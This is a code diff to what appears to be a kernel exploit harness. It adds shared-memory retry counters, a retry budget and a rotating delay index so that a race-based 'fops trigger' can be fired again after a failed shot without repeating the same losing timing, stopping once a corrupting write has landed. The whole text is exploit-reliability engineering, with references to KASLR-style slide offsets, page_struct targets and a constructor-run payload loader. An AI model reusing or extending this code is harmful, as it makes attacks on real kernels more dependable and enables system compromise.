@@ -22,6 +22,11 @@ struct app_p0_shared_state {
   atomic_int slide_ready;
   atomic_int p0_ready;
   atomic_int writer_started;
+#if defined(APP_FOPS_RETRY_BUDGET) && APP_FOPS_RETRY_BUDGET > 1
+  atomic_int write_landed;
+  atomic_int fops_retries;
+  atomic_int route_delay_index;
+#endif
   _Atomic uintptr_t offset;
   _Atomic uintptr_t gate_page_struct;
   _Atomic uintptr_t probe_page_struct;
@@ -60,6 +65,41 @@ void app_publish_writer_started(void) {
     atomic_store(&app_p0_state->writer_started, 1);
   }
 }
+
+#if defined(APP_FOPS_RETRY_BUDGET) && APP_FOPS_RETRY_BUDGET > 1
+/*
+ * A trigger that never opened its window is state-neutral: the injected
+ * waiter timed out and was dequeued, so the scheduler state is what it was
+ * before the shot. Only a landed write makes the boot unrepeatable.
+ */
+void app_publish_write_landed(int ok) {
+  if (app_p0_state && ok) {
+    atomic_store(&app_p0_state->write_landed, 1);
+  }
+}
+
+int app_fops_retry_count(void) {
+  return app_p0_state ? atomic_load(&app_p0_state->fops_retries) : 0;
+}
+
+int app_fops_retry_next(void) {
+  if (!app_p0_state) {
+    return 1;
+  }
+  return atomic_fetch_add(&app_p0_state->fops_retries, 1) + 1;
+}
+
+/*
+ * The delay table index lives in shared memory because every shot is a
+ * fresh supervisor child: a process-local static would restart at 0 and
+ * replay the identical losing delay on every retry.
+ */
+int app_route_delay_next_index(void) {
+  return app_p0_state
+      ? atomic_fetch_add(&app_p0_state->route_delay_index, 1)
+      : 0;
+}
+#endif
 
 #endif
 
@@ -235,8 +275,24 @@ __attribute__((constructor)) static void load(void) {
 
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
     if (atomic_load(&app_p0_state->writer_started)) {
+#if defined(APP_FOPS_RETRY_BUDGET) && APP_FOPS_RETRY_BUDGET > 1
+      if (atomic_load(&app_p0_state->write_landed)) {
+        pr_error("write landed; refusing further fops retries on this "
+                 "boot\n");
+        break;
+      }
+      if (app_fops_retry_count() >= APP_FOPS_RETRY_BUDGET - 1) {
+        pr_error("fops trigger failed %d times; refusing further "
+                 "retries\n", APP_FOPS_RETRY_BUDGET);
+        break;
+      }
+      pr_warning("fops trigger did not fire; retrying (fops shot "
+                 "%d/%d)\n",
+                 app_fops_retry_next() + 1, APP_FOPS_RETRY_BUDGET);
+#else
       pr_error("stack writer ran; refusing retry on this boot\n");
       break;
+#endif
     }
 #endif
 
